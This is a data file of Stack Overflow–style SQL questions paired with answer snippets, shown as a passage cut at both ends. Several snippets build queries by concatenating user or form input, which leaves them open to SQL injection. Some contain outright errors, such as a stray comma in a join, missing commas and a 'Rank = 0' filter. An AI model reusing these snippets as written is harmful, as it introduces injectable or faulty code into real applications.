FROM [tblData]
GROUP BY
      [Sample ID]
"
14154,43901,Oracle/SQL - Using query results as paramaters in another query -looping?,"create or replace function SampleFunction
(
  owner     in VarChar
 ,tableName in VarChar
) return integer authid current_user is
  result Integer;
begin
  execute immediate 'select count(*) from ""' || owner || '"".""' || tableName || '""'
    INTO result;

  return result;
end;
"
38785,11509,How to create initial_data Json fixture for many-to-many relation?," [
    { 
        ""model"": ""sites.word"", 
        ""pk"": 1,
        ""fields"": { 
            ""name"": ""apple"",
            ""my_m2m_field_name"": [1,2,3],
        }
     }
]
"
29596,62276,Get the database name in which Stored Procedure exists,"EXEC sp_msforeachdb 
'if exists(select 1 from [?].sys.objects where name=''SP_Email'')
select ''?'' as FoundInDatabase from [?].sys.objects where name=''SP_Email'''
"
38385,68895,How can I drop a table if it exists in SQL Server 2000?,"IF OBJECT_ID('temp_ARCHIVE_RECORD_COUNTS') IS NOT NULL  
  DROP TABLE temp_ARCHIVE_RECORD_COUNTS  
"
11076,70439,Rounding numbers to 2 digits after comma in oracle,"with t (n) as (
  select 123.5678 from dual
  union all select 123.5000 from dual
  union all select 23.5000 from dual
  union all select 0 from dual
  union all select 1 from dual
  union all select 10 from dual
  union all select 100 from dual
)
select n,
  round(n, 2) as n2,
  to_char(round(n, 2), '99999.99'),
  to_char(round(n, 2), 'FM99999.00') as str2,
  to_char(round(n, 2), 'FM99990.00') as str3
from t;

         N         N2 TO_CHAR(R STR2      STR3    
---------- ---------- --------- --------- ---------
  123.5678     123.57    123.57 123.57    123.57   
     123.5      123.5    123.50 123.50    123.50   
      23.5       23.5     23.50 23.50     23.50    
         0          0       .00 .00       0.00     
         1          1      1.00 1.00      1.00     
        10         10     10.00 10.00     10.00    
       100        100    100.00 100.00    100.00   
"
10857,63174,MySQL order results by total by weights,"SELECT
    p.ID,
    COUNT(DISTINCT comments.ID) as comments,
    COUNT(DISTINCT likes.ID) as likes,
    COUNT(DISTINCT comments.ID)* 6 + COUNT(DISTINCT likes.ID)* 4 as `order`
FROM
    posts p LEFT JOIN comments on p.id = comments.post_id
    LEFT JOIN likes` ON likes.`post_id` = p.`ID`
GROUP BY
    p.ID
ORDER BY
    `order`
"
27044,68085,How to concat strings with space delimiter where each string is nullable?,"SELECT
  RTRIM(CONCAT(  
      NULLIF(f1, '') + ' '
    , NULLIF(f2, '') + ' '
    , NULLIF(f3, '') + ' '
  ))
FROM
  @test
"
14808,57020,Summing dates across multiple rows in SQL?,";WITH CTE_Timespans AS
(
    SELECT
        TagID,
        SetPointID,
        InAlarm,
        EventLogTime,
        LEAD(EventLogTime, 1) OVER (PARTITION BY TagID, SetPointID ORDER BY EventLogTime) AS EndingEventLogTime
    FROM
        My_Table
)
SELECT
    TagID,
    SetPointID,
    SUM(DATEDIFF(SS, EventLogTime, EndingEventLogTime))/3600.0 AS TotalTime
FROM
    CTE_Timespans
WHERE
    InAlarm = 1
GROUP BY
    TagID,
    SetPointID
"
12459,18815,is it possible to have multiple foreign key from the same table?,"select * from Person
join PersonSchedule on PersonSchedule.PersonId= Person.Id
join Schedules on Schedules.Id = PersonSchedule.ScheduleId
"
38226,69415,SQL question: Getting records based on datediff from record to record,"select distinct t1.*
from Table1 t1
inner join Table1 t2 
    on abs(cast(t1.Date_Created - t2.Date_Created as float)) between 1 and 2
"
35296,18916,SQL Pivot table,"CASE WHEN t.AttributeID = 10 THEN t.EntityValue ELSE NULL END 'FirstName'
"
26213,48396,SQL Server : PDO `IN` statement syntax,"$ids = array(1,2,3);
$in  = str_repeat('?,', count($arr) - 1) . '?';
$sql = ""SELECT * FROM table WHERE column IN ($in)"";
$stm = $db->prepare($sql);
$stm->execute($ids);
$data = $stm->fetchAll();
"
7994,30260,Left Outer Join not returning expected result,"SELECT a.id, b.match_id 
FROM player a 
  LEFT OUTER JOIN game b 
     ON (a.team_id = b.home_team_id or a.team_id = b.away_team_id) 
    AND b.round = 1 
"
7556,20077,MySQL group by with multiple column sums and a total sum for each group,"SELECT person, 
       sum(positive_vote) totalPositive, 
       sum(negative_vote) totalNegative,
       (sum(positive_vote) + sum(negative_vote)) totalVotes
FROM Votes 
GROUP BY person
-- HAVING (sum(positive_vote) + sum(negative_vote)) < 5
"
9908,8557,How can I design a select statement to select a subset of values exclusively based on a condition?,"WITH rn AS (
  SELECT *, ROW_NUMBER() OVER(PARTITION BY TransactionID ORDER BY Cost) rn
  FROM Table2
)
SELECT rn.TransactionID, rn.Cost, COALESCE(t1.TotalItemsType1, 0) TotalItemsType1,
       COALESCE(t1.TotalItemsType2, 0) TotalItemsType2
FROM rn LEFT JOIN Table1 t1
  ON rn.TransactionID = t1.TransactionID AND rn.rn = 1
"
24969,51400,How to store selected data in a list in vb.net?,"dim x as integer

for x = 0 to datTable.rows.count - 1
  listOfCanteenSwipe.Add(datTable.rows(x).item(""datarec""))
next
"
26266,44994,joining tables in sql with if exists for values that do not exist in table1 from table2,"select e.EmpId, p.pkid, e.Employee, p.project, ets.Day
from
    projectname as p
    cross join
    /* do you have an employees table? */
    (select distinct EmpId, Employee from employeetimesheets) as e
    left outer join
    employeetimesheets as ets
        on ets.projectnames = p.project
            and ets.Empid = e.Empid
order by e.EmpId, p.pkid, ets.Day
"
37777,75425,How to convert value in T-SQL Views,"SELECT CASE when status = 0 then 'pass'
when status = 1 then 'warning'
when status = -1 then 'fail'
end as [status]
"
36194,28860,How to group duplicate records and then update all members except lowest id for each group?,"update temp1 set publish=0 where id in (select x.id from (select a.id from temp1 a ,temp1 b 
where
a.id<>b.id and (a.name=b.name or a.description=b.description)and a.id>b.id 
group by a.id) as x); 
"
15959,40146,Query joining multiple tables,"select a.AppointmentID, b.Surname, b.FNAME, c.Surname, c.FName
from Appointment as a
Inner join Doctor as b on b.DoctorID = a.DoctorID
Inner join Patient as c on c.PatientID = a,PatientID
"
5064,26284,Select the highest record of each relation,"SELECT
  t.user_id,
  t.page_id AS most_visited_page_id
FROM (
      SELECT 
        pu.user_id,
        pu.page_id,
        COUNT(*) AS visitCount
      FROM page_user pu
        INNER JOIN page p ON p.id = pu.page_id
        INNER JOIN user u ON u.id = pu.user_id
      GROUP BY pu.user_id, pu.page_id
      ORDER BY pu.user_id, visitCount DESC, rand() <-- In case of multiple
                          page with same count it will give random page or you can check 
                          it with most recent visit with date if any -->

    ) AS t
GROUP BY t.user_id
"
33306,68480,SQL. How to select multiple rows by using the MIN and GROUP BY,"SELECT MIN(a.id) Tbl1ID, b.RewardId
FROM mytable a
JOIN mytable b
  ON a.name = b.name
GROUP BY b.userid, b.rewardid
ORDER BY tbl1id, rewardid;
"
29986,4614,How to make a view in SQL Server?,"CREATE VIEW viewname AS SELECT <the rest of select query here>
"
15756,24939,Oracle Query for finding non-repeated rows,"SELECT name FROM tbl_name GROUP BY name HAVING COUNT(name) = 1 
"
34952,62797,Selecting data from one table or another in multiple queries PL/SQL,"select 1st query where boss_condition
union all
select 2nd query where not boss_condition
"
13483,991,Help with recursive query,"SELECT 
	DocNum,
	STUFF((SELECT ', ' + CAST(DocEntry AS VARCHAR(MAX)) AS [text()]
		FROM Temp5 b
		WHERE a.DocNum = b.DocNum
		FOR XML PATH('')), 1, 2, '') AS DocEntry
FROM Temp5 a
GROUP BY DocNum
"
9994,46258,MS ACCESS vba select,"strSQL = ""Select * from [dbo_tempDetail] where [userID] = "" & _
             [Forms]![frmUserInfo]![txtCLIENTID] & "";""
'might have to quote the txtCLIENTID value
strSQL = ""Select * from [dbo_tempDetail] where [userID] = '"" & _
             [Forms]![frmUserInfo]![txtCLIENTID] & ""';""
"
14890,50822,Not able to get a subquery working,"SELECT  Factuur.FactuurNR,Prijzen.Borg
FROM ((Prijzen 
     INNER JOIN Autos ON Autos.Klasse = Prijzen.Klasse)
     INNER JOIN Factuur ON Factuur.AutoNR = Autos.AutoNR)
GROUP BY Factuur.FactuurNR,Prijzen.Borg;
"
2028,24140,Android how to query huge database in android (cursor size is limited to 1MB),"   int limit = 0;
   while (limit + 100 < numberOfRows) {
       //Compose the statement
       String statement = ""SELECT * FROM Table ORDER someField LIMIT '""+ limit+""', 100"";
       //Execute the query
       Cursor cursor = myDataBase.rawQuery(statement, null);
       while (cursor.moveToNext()) {
           Product product = new Product();
           product.setAllValuesFromCursor(cursor);
           productsArrayList.add(product);
      }
      cursor.close();
      limit += 100;
 }

 //Compose the statement
 String statement = ""SELECT * FROM Table ORDER someField LIMIT '""+  (numberOfRows - limit)+""', 100"";
 //Execute the query
 Cursor cursor = myDataBase.rawQuery(statement, null);

 while (cursor.moveToNext()) {
     Product product = new Product();
     product.setAllValuesFromCursor(cursor);
     productsArrayList.add(product);
 }
 cursor.close();
"
11001,62933,Set date = tomorrow at a static time in Oracle PLSQL?,"end_date:=trunc(sysdate+1);
"
38881,61124,Joining Oracle ApEx Collections to Actual Tables,"select c001,  -- employee id from collection
       c002,
       c003   -- employee dept no from collection
from   apex_collections,
       emp emp
where  emp.empno = c001
and    emp.deptno = c003;
"
36943,56178,Update table with line number using Row_Number() using SQL,"with cte (id, dln, sln)
as
(
   select id, dense_rank() over (partition by doc_no order by stk_code asc) as dln
      , row_number() over (partition by doc_no, stk_code order by serial_no asc) as sln
   from @t_test
)
update @t_test
set doc_lineno = cte.dln
   , stk_lineno = cte.sln
from @t_test as t
inner join cte as cte
on t.id = cte.id
;
"
23972,46168,Execute query on SQL Server Analysis Services with IronPython,"clr.AddReference (""Microsoft.AnalysisServices.AdomdClient.dll"")
clr.AddReference (""System.Data"")

from Microsoft.AnalysisServices.AdomdClient import AdomdConnection , AdomdDataAdapter
from System.Data import DataSet

conn = AdomdConnection(""Data Source=0.0.0.0;Catalog=MyCatalog;"")
conn.Open()
cmd = conn.CreateCommand()
cmd.CommandText = ""your mdx query"" # in your case 'select from finance'
adp = AdomdDataAdapter(cmd)
datasetParam =  DataSet()
adp.Fill(datasetParam)
conn.Close();

# datasetParam hold your result as collection a\of tables
# each tables has rows
# and each row has columns
print datasetParam.Tables[0].Rows[0][0]
"
23498,59347,How to optimise this query using table join?,"update t1
SET col1 = 'NA'
from tab1 t1
inner join tab2 t2 on t1.col2=t2.col1 and t2.col2 is null
inner join tab3 t3 on t2.col3=t3.col1 and t3.col2 = 100
"
3017,14231,How to list all databases and their schemas in postgresql?,"CREATE OR replace FUNCTION databases_schemas_size 
  () returns setof RECORD 
AS 
  $body$ 

  DECLARE 

    connection_info CHARACTER varying; 
    i RECORD; 
    r RECORD; 

  BEGIN 

    FOR r IN SELECT cast(datname AS CHARACTER varying) FROM  pg_database  WHERE  datistemplate = FALSE LOOP 

    SELECT format ('dbname=%s user=%s password=%s', r.datname, 'YOUR_ALLOWED_USERNAME', 'PASSWORD') INTO   connection_info; 

    perform dblink_connect(connection_info); 
    FOR i IN SELECT r.datname, * 
    FROM   dblink('SELECT nspname , pg_size_pretty(sum(pg_relation_size(C.oid))) AS size FROM pg_class C LEFT JOIN pg_namespace N ON (N.oid = C.relnamespace) WHERE nspname NOT IN (''pg_catalog'', ''information_schema'') group by nspname') 
    AS t(schema_name CHARACTER varying, schema_size text) 

    LOOP 
    RETURN NEXT i; 
    END LOOP; 

  perform dblink_disconnect(); 
END LOOP; 

RETURN; 

END; 
$body$ LANGUAGE plpgsql volatile cost 100; 


SELECT * FROM  databases_schemas_size() 
AS (datname CHARACTER varying, schema_name CHARACTER varying, schema_size text);
"
8909,17099,Display table values for select in anonymous code block in Oracle,"BEGIN
   OPEN :rc FOR
      SELECT * FROM MyTable;
END;
"
30892,20254,SQL - Grab record with minimum date until cost changes,";with a as
(
  select po, log_ts, cost, row_number() over (partition by po order by log_ts) rn
  from <table>
), b as
(
  select po, log_ts, cost, 1 grp, rn from a where rn = 1
  union all
  select a.po, a.log_ts, a.cost, case when a.cost = b.cost then b.grp else b.grp+1 end, a.rn
  from a
  join b on a.rn = b.rn+1 and a.po = b.po
)
select po, min(log_ts) log_ts, cost 
from b
group by po, cost, grp
"
3478,26524,SQL query: calculating a matrix of totals,"   SELECT 
     SUM(`WTE`) / 1000 AS WTE, o.band, o.age
   FROM  `orthoptists` AS o
   LEFT JOIN `instances` AS i
   ON o.instance_FK = i.id
   WHERE i.region = 14
   group by o.band, o.age
"
11566,74080,"sql - beginning of hour, month etc","select dateadd(month, datediff(month, 0, getdate()),0) 

select dateadd(hour, datediff(hour, 0, getdate()),0)
"
29654,9101,SQL Query Help - Maximum date required,"SELECT * FROM
( -- insert your query here with new line below in the select fields
, ROW_NUMBER() OVER (PARTITION BY CUST_RETAIL_CHANNEL_NAME ORDER BY addressvalidfrom DESC) AS Rnk
) D
WHERE D.Rnk=1
"
572,2314,INSERT and UPDATE in one query MYSQL,"CREATE TRIGGER tg_ai_orders
AFTER INSERT ON orders
FOR EACH ROW
  UPDATE bands 
     SET stock = stock - 1
   WHERE band_id = NEW.band_id;

CREATE TRIGGER tg_ad_orders
AFTER DELETE ON orders
FOR EACH ROW
  UPDATE bands 
     SET stock = stock + 1
   WHERE band_id = OLD.band_id;
"
15095,36092,SQL fetch xml data attribute and values from non xml type column,"declare @temp table (data ntext)

insert into @temp (data)
select '<message to=""4075@abc.myftp.org"" type=""chat"" from=""5082@abc.myftp.org/e76bea0f"">
<body>james bond</body>
<active xmlns=""http://jabber.org/protocol/chatstates"" />
</message>'

select
    c.data.value('message[1]/@to', 'nvarchar(max)')
from @temp as t
    outer apply (select cast(data as xml)) as c(data)
"
9600,51644,How to select possibly non-existant row in a mysql join,"select c.*, p1.PREFERENCE_VALUE as VALUE1, p2.PREFERENCE_VALUE as VALUE2 
  from 
    COMPANIES 
    inner join PREFERENCES p1 
      on c.ID = p1.COMPANY_ID and p1.PREFERENCE_VALUE = 1
    left outer join PREFERENCES p2 
      on c.ID = p2.COMPANY_ID and p2.PREFERENCE_VALUE = 2
   where 
     COMPANIES.ID = 1;
"
27427,1969,Insert Select with additional parameters in SQL Server,"INSERT INTO [epmscdc].[dbo].[billing] ([pid] ,[did] ,[lid] ,[totalamt] ,[cash] ,[bchange] ,[btrans_date])
SELECT patientlab.did, patientlab.pid, patientlab.lid, laboratory.lprice , 1000,1000,GETDATE()
FROM patientlab
INNER JOIN laboratory ON patientlab.lid = laboratory.lid
INNER JOIN doctor ON patientlab.did = doctor.did 
WHERE patientlab.pid = 3 AND pstatus = '-'
"
15683,42263,PL SQL find duplicate in collection,"DECLARE
  type tt IS TABLE OF VARCHAR2(10);
  orig tt;
  tmp  tt;
BEGIN
  orig := tt('a', 'b', 'b', 'b', 'c', 'd', 'a');
  tmp  := SET(orig);
  IF (tmp.count = orig.count) THEN
    dbms_output.put_line('no duplicates');
  ELSE
    dbms_output.put_line('there are duplicates:');
    tmp := SET(orig MULTISET except tmp);
    FOR i IN 1 .. tmp.count
    LOOP
      dbms_output.put_line(tmp(i));
    END LOOP;
  END IF;
END;
/
"
39127,63776,Displaying rows in SQL Server where COUNT = 0,"SELECT
    R.RegionName,
    COUNT(O.uid)
FROM
    Regions R
LEFT OUTER JOIN Customers C ON C.Region = R.uid  -- I really don't like this naming convention
LEFT OUTER JOIN Orders O ON
    O.CustomerID = C.uid AND
    O.DateOrdered LIKE '7%2011%'  -- Is your date really stored as a string? Ugh!
WHERE
    R.RegionName <> 'NULL' AND   -- This is VERY bad...
    R.RegionName <> '' AND
    R.RegionName <> 'Region 1'
GROUP BY
    R.RegionName
ORDER BY
    R.RegionName
"
11690,31260,MySQL Query Subtraction values,"SELECT 
      a.purchase_code,
      b.item_code, 
      '15' AS status_code,
      SUM(
        CASE b.status_code 
            WHEN 15 THEN b.itempurchase_quantity
        ELSE 
            - (b.itempurchase_quantity) 
        END) 
        AS itempurchase_quantity,
      b.item_costprice
FROM qa_items_purchases b
    INNER JOIN qa_suppliers_invoices a 
        ON a.supplier_invoice_code = b.item_invoicecodesupplier
GROUP BY purchase_code, b.item_code, b.item_costprice
    HAVING itempurchase_quantity > 0
    ORDER BY purchase_code 
    LIMIT 0,20000
"
34128,5362,Select highest record of type per foreign key,"select
    l.*
from
    log l
    inner join (
    select
        max(log_id) as maxid
    from
        log
    group by
        domain_id,
        type
    ) l2 on
        l.log_id = l2.maxid
"
25503,47074,count number of rows that occur for each date in column date range,"WITH Dates AS (
    SELECT DateAdd(d, Numbers.Number - 1, '1/1/2001') AS Date
    FROM Numbers
    WHERE Numbers.Number BETWEEN 1 AND 100000 -- Arbitrary date range
)
SELECT GroupData.Group, Dates.Date, COUNT(*)
FROM Dates
LEFT JOIN GroupData
    ON Dates.Date BETWEEN GroupData.StartDate AND GroupData.EndDate
GROUP BY GroupData.Group, Dates.Date
ORDER BY GroupData.Group, Dates.Date
"
18978,71530,Doctrine/Symfony losing M:N relationships on save,"public function configure()
{
  unset($this['beta_meeting_list']); // or the correct value
}
"
903,41861,SQL Batch Import/Insert into multiple tables,"--Assuming TableA is 

/*
CREATE TABLE TABLEA
{
RowID INT IDENTITY(1,1)
,Row_ELEMENTS1 varchar(25)
,StageRecordID int  ---you need to add this column to the Table
}
*/
INSERT INTO TABLEA
(
Row_ELEMENTS1,
StageRecordID
)
   SELECT Col1 AS Row_ELEMENTS1,StageRecordID FROM StaginTable


--NOW assuming TABLEB is 

/*
CREATE TABLE TABLEA
{
PROPID  INT IDENTITY(1,1)
,Row_ELEMENTS2 varchar(25)
,ROWID 
,StageRecordID int ---you need to add this column to the Table
}
*/
INSERT INTO TABLEB
(
Row_ELEMENTS2,
ROWID,
StageRecordID
   )
    SELECT a.Col2 AS Row_ELEMENTS2, b.ROWID ,a.StageRecordID FROM StaginTable AS a
    INNER JOIN TABLEA AS b
    ON a.StageRecordID=b.StageRecordID 
"
13292,51390,Joining 3 SQL queries into one result set,"select DRPS.assetnumber, DRPS.MOCALCSUM,DRPS.MICALCSUM,
    DRPS.COCALCSUM,DRPS.CICALCSUM,ISSUED.TotalIssued,REDEEMED.TotalRedeemed
from (select assetnumber, sum(mocalc) AS [MOCALCSUM],sum(micalc) AS [MICALCSUM],
        sum(cocalc) AS [COCALCSUM],sum(cicalc) AS [CICALCSUM]
        from drops
        where  dropdate > '09/01/2012' and dropdate < dateadd(hour,-0,getdate())
        group by assetnumber) AS DRPS
LEFT JOIN (select snissued,sum(amount) AS [TotalIssued] from tickets
    where  dateissued > '09/01/2012' and dateissued < dateadd(hour,-0,getdate())
    group by snissued) AS ISSUED
    ON DRPS.assetnumber=ISSUED.snissued
LEFT JOIN (select snredeemed,sum(amount) AS [TotalRedeemed] from tickets
    where  dateredeemed > '09/01/2012' and dateredeemed < dateadd(hour,-0,getdate())
    group by snredeemed) AS REDEEMED
    ON DRPS.assetnumber=REDEEMED.snredeemed
"
12290,11765,sum by rows (include all columns) in Oracle,"SELECT  t.*,
        COALESCE(Monday, 0) +
        COALESCE(Tuesday, 0) +
        COALESCE(Wednesday, 0) +
        COALESCE(Thursday, 0) +
        COALESCE(Friday, 0) AS total
FROM    mytable t
"
3704,27496,SQLite - Returning column total w/all rows,"SELECT  a.transaction_amount,
        a.transaction_date,
        b.Total
FROM prepaid_tbl  a,
        (
            SELECT  SUM(transaction_amount) AS  Total 
            FROM prepaid_tbl 
            WHERE playerID = 17 
        ) b
WHERE a.playerID = 17 
"
31619,5995,"in a select query, getting the count of something from another table","SELECT m.id, m.username, COUNT(p.id)
FROM members m 
LEFT JOIN posts p ON m.id = p.memberid
GROUP BY m.id;
"
26122,65888,SQL Query to retrieve highest item up to a point in a group,"select p.*
from person p
inner join (
    select surname, max(age) as maxage
    from person 
    where age < 30
    group by surname
) pm on p.surname = pm.surname and p.age = pm.maxage
"
37411,67381,DESCRIPTION' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause,"INSERT INTO myTable2 (ID,INDEX,STATUS,DESCRIPTION,TS)
SELECT ID,min(INDEX),STATUS,DESCRIPTION,min(TS) from myTable2 t1top
WHERE (EXISTS(
    SELECT * FROM myTable1 WHERE ID=t1top.ID AND STATUS='Completed' )) 
GROUP BY ID, STATUS, DESCRIPTION
ORDER BY ID  DESC, STATUS DESC
"
14911,32791,SQL 2005 Combine multiple record into one,"SELECT t.Time, LEFT(Names , LEN(Names )-1) as Names
FROM yourtable t
CROSS APPLY
(
    SELECT t1.Name + ','
    FROM yourtable t1
    WHERE t.Time= t1.Time
    FOR XML PATH('')
) pre_trimmed (Names)
GROUP BY Time, Names;
"
21401,2728,Generating MySQL UPDATE statements containing BLOB image data,"select concat( 'UPDATE `IMAGE` SET THUMBNAIL = ', 
               0xC9CBBBCCCEB9C8CABCCCCEB9C9CBBB...., 
               ' WHERE ID = ', ID, ';' ) as UPDATE_STATEMENT
  from IMAGE;
"
2016,21991,Deleting and replacing entries in a table using SQL Server,"--update cats to felines
Update ""mammal attribute table""
set AttributeID = 456 
where AttributeID=234

go 

--delete cat attribute
delete from attributetable where AttributeID=234
go 

--delete duplicate feline attribute
delete 
from ""mammal attribute table"" 
where mammalattributeid in(
        select max(mammalattributeid)
        from ""mammal attribute table"" 
        group by mammalid,attributeid
        having count(*)>1)
"
22591,54343,Can I include the table name in the result of an SQL query?,"select ID, 'Actor' as Career, Name from Actor
union all
select ID, 'Singer' as Career, Name from Singer
"
3713,33914,How to implement a friendship system in my database?,"select case when id_user1=$my_user_id then alias_user2 else alias_user1 end
from friends
where id_user1=$my_user_id or id_user2=$my_user_id
"
4565,17258,Comparing two tables and finding partial match (SQL / Oracle),"    select s.id_glo
         , r.id_glo
      from eb_site     s
inner join eb_register r on (     replace(replace(s.id_glo, 'kplus.hs.register.', ''), 'kplus.hs.dlsn.', '') <> replace(replace(r.id_glo, 'kplus.hs.register.', ''), 'kplus.hs.dlsn.', '')
                              and replace(replace(r.id_glo, 'kplus.hs.register.', ''), 'kplus.hs.dlsn.', '') not like replace(replace(s.id_glo, 'kplus.hs.register.', ''), 'kplus.hs.dlsn.', '') || '-%'
           )
         ;
"
4150,39586,Procedure to update column values in Oracle,"create or replace PROCEDURE procedure_name (parameter_newcode code%TYPE) AS
 CURSOR cursor_name IS select code from myTable
                           order by code asc;
  var_oldCode code%TYPE;
  var_newCode code%TYPE;
  BEGIN
  var_newCode:=parameter_newcode;
  OPEN cursor_name;
  LOOP
  FETCH cursor_name INTO var_oldCode;
  EXIT WHEN cursor_name%NOTFOUND;
  var_newCode:=var_newCode+1;
  update myTable set code = var_newCode where code = var_oldCode;
  END LOOP;
  CLOSE cursor_name;
 END procedure_name;
"
2050,9175,"Database structure for ""customer"" table having many orders per customer and many items per order","CREATE SCHEMA IF NOT EXISTS `mydb` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci ;
USE `mydb` ;

-- -----------------------------------------------------
-- Table `mydb`.`Customer`
-- -----------------------------------------------------
CREATE  TABLE IF NOT EXISTS `mydb`.`Customer` (
  `ID` INT NOT NULL ,
  `Name` TEXT NOT NULL ,
  `PhoneNo` VARCHAR(45) NULL ,
  PRIMARY KEY (`ID`) )
ENGINE = InnoDB;


-- -----------------------------------------------------
-- Table `mydb`.`Order`
-- -----------------------------------------------------
CREATE  TABLE IF NOT EXISTS `mydb`.`Order` (
  `ID` INT NOT NULL ,
  `customer_id` INT NULL ,
  PRIMARY KEY (`ID`) ,
  INDEX `fk_Order_1_idx` (`customer_id` ASC) ,
  CONSTRAINT `fk_Order_1`
    FOREIGN KEY (`customer_id` )
    REFERENCES `mydb`.`Customer` (`ID` )
    ON DELETE NO ACTION
    ON UPDATE NO ACTION)
ENGINE = InnoDB;


-- -----------------------------------------------------
-- Table `mydb`.`Product`
-- -----------------------------------------------------
CREATE  TABLE IF NOT EXISTS `mydb`.`Product` (
  `ID` INT NOT NULL ,
  `Name` VARCHAR(45) NOT NULL ,
  `Description` TEXT NULL ,
  PRIMARY KEY (`ID`) )
ENGINE = InnoDB;


-- -----------------------------------------------------
-- Table `mydb`.`OrderItem`
-- -----------------------------------------------------
CREATE  TABLE IF NOT EXISTS `mydb`.`OrderItem` (
  `ID` INT NOT NULL ,
  `Order_ID` INT NOT NULL ,
  `Product_ID` INT NOT NULL ,
  `Quantity` INT NOT NULL ,
  PRIMARY KEY (`ID`) ,
  INDEX `fk_OrderItem_1_idx` (`Order_ID` ASC) ,
  INDEX `fk_OrderItem_2_idx` (`Product_ID` ASC) ,
  CONSTRAINT `fk_OrderItem_1`
    FOREIGN KEY (`Order_ID` )
    REFERENCES `mydb`.`Order` (`ID` )
    ON DELETE NO ACTION
    ON UPDATE NO ACTION,
  CONSTRAINT `fk_OrderItem_2`
    FOREIGN KEY (`Product_ID` )
    REFERENCES `mydb`.`Product` (`ID` )
    ON DELETE NO ACTION
    ON UPDATE NO ACTION)
ENGINE = InnoDB;

USE `mydb` ;
"
23270,832,SQL Server query joining a table with the results of another query,"WITH [counter](N) AS
(SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 1 UNION ALL
 SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 1 UNION ALL
 SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 1 UNION ALL
 SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 1 UNION ALL
 SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 1 UNION ALL
 SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 1 UNION ALL
 SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 1 UNION ALL
 SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 1 UNION ALL
 SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 1 UNION ALL
 SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 1 UNION ALL
 SELECT 1),
SSOReportDays(N) AS (SELECT row_number() OVER (ORDER BY (SELECT NULL)) FROM [counter]),
SSOReportMonths(N) AS (SELECT N - 1 FROM SSOReportDays WHERE N <= 12),
SSOReportYears(N) AS (SELECT N - 1 FROM SSOReportDays WHERE N <= @SSOReportDateRangeYears),
Calendar AS(
SELECT DISTINCT
CAST(DATEADD(DAY, SSOReportDays.n,
     DATEADD(MONTH, SSOReportMonths.n,
     DATEADD(YEAR, SSOReportYears.n,
     DATEADD(DAY, -1, @SSOReportDateRangeBegin)))) AS DATE) AS CalendarDate
     /* Subtract 1 day from @SSOReportDateRangeBegin,
        because the counter will begin with the following day. */

/* CROSS JOIN to compute every possible combination
   of day(1-31) month(1-12) and year(1-10) */
FROM SSOReportYears CROSS JOIN SSOReportMonths CROSS JOIN SSOReportDays

/* Reduce calendar to <= the current date,
   since incident tickets cannot be created with future dates. */
WHERE CAST(DATEADD(DAY, SSOReportDays.n,
           DATEADD(MONTH, SSOReportMonths.n,
           DATEADD(YEAR, SSOReportYears.n,
           DATEADD(DAY, -1, @SSOReportDateRangeBegin)))) AS DATE) <= CAST(GETDATE() AS DATE)),
TicketCount AS (
SELECT TicketDate, Status, Count(*) cnt -- These are just fake columns. Use your columns
FROM dbo.IncidentDimvw
GROUP BY TicketDate, Status)
SELECT c.CalendarDate, O.cnt, C.cnt, E.cnt
FROM Calendar c
LEFT JOIN TicketCount O ON c.CalendarDate = O.TicketDate AND O.Status = 'Open'
LEFT JOIN TicketCount C ON c.CalendarDate = C.TicketDate AND C.Status = 'Close'
LEFT JOIN TicketCount E ON c.CalendarDate = E.TicketDate AND E.Status = 'etc.' -- keep adding until you get all required statuses
ORDER BY 1
"
7030,11541,MySQL: counts by week.,"select  
concat(cast(DATE_ADD(yourdate, INTERVAL(1-DAYOFWEEK(yourdate)) DAY) as char), ' - ',
cast(DATE_ADD(yourdate, INTERVAL(7-DAYOFWEEK(yourdate)) DAY) as char))
as period, count(*) 
from tablename 
group by week(yourdate)
"
1552,14784,Converting Previous Row Subquery into a Join in MySQL,"select
        p.policy_iteration_id,
        p.policy_id,
        p.updated_on
from 
    policy f
        inner join (
    select
        p.policy_iteration_id,
        p.policy_id,
        p.updated_on,
        max(f.policy_id) as prev_policy_id
    from
        policy p
            inner join 
        policy f 
            on f.policy_iteration_id = p.policy_iteration_id and
               f.policy_id < p.policy_id
    where
        p.updated_on >= $from_date and
        p.updated_on <= $to_date and
        p.policy_status_id = $to_status_id
    group by
        p.policy_iteration_id,
        p.policy_id,
        p.updated_on
) p
        on p.prev_policy_id = f.policy_id
where
    f.policy_status_id = $from_status_id
"
1189,38843,e-commerce structure for products (MySQL),"displayable_product
id   name
1    ""Baseball Cap""
2    ""T-Shirt""

orderable_product
id   d_product_id order_id  size    color   price
1    1            123               red      9.99
2    2            456       small           19.99
3    2            789       medium          21.99

displayable_content
id   d_product_id  locale  name                 image
1    1             en_US   ""Baseball Cap""       baseballcap.jpg
2    1             es_US   ""Gorra de Beisbol""   baseballcap.jpg
3    2             en_US   ""Nice T-Shirt""       nicetshirt.jpg
4    2             es_US   ""Camiseta""           nicetshirt.jpg
"
32794,9707,Select distinct ... inner join vs. select ... where id in (...),"select * from Users u
where exists 
   ( select user_id 
     from Log_mview l
     where l.user_id = u.user_id )
/
"
35353,32836,Very hard greatest n per group query,"WITH RankedPost AS (
    SELECT
        P.PostID,
        P.CharacterID,
        P.DateTime
        RANK() OVER (
                PARTITION BY CharacterID, 
                ORDER BY DateTime DESC) Rank,
        RANK() OVER (
                PARTITION BY CharacterID, 
                ORDER BY DateTime ASC) Count
        FROM RPGPost P)
SELECT
    P.DateTime
    P.CharacterID,
    P.Count
FROM RankedPost P
WHERE
    RankedPost.Rank = 0;
"
18075,9853,Getting the whole row from grouped result,"select a.id, a.productid, a.price
from mytable a,
    (select productid, max(datechanged) as maxdatechanged
    from mytable
    group by productid) as b
where a.productid = b.productid and a.datechanged = b.maxdatechanged
"
32411,53395,SQL regular expressions of adjacent characters in a string,"select columns
from tablename
where columnname like 'A%'
  and substring(columnname from 5 for 2) in ('AB','CD','EF')
"
24100,50275,Merging two SQL queries,"select name, price
from room
where capacity >= $partySize
and room_id not in 
  (select room_id
   from room_booking
